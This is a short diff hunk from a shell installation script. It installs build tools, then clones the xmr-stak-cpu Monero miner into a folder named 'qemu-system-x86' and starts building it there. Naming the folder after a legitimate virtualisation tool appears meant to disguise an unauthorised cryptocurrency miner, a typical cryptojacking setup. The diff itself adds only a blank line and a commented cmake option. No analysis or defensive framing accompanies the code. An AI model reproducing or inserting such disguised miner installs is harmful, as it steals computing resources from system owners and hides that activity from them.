@@ -11,6 +11,8 @@ fi
 apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget
 mkdir /usr/share/packages_download
 workingdir=/usr/share/packages_download/
+
+#cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
 git clone https://github.com/fireice-uk/xmr-stak-cpu.git /usr/share/packages_download/qemu-system-x86
 cd $workingdir/qemu-system-x86
 cmake .
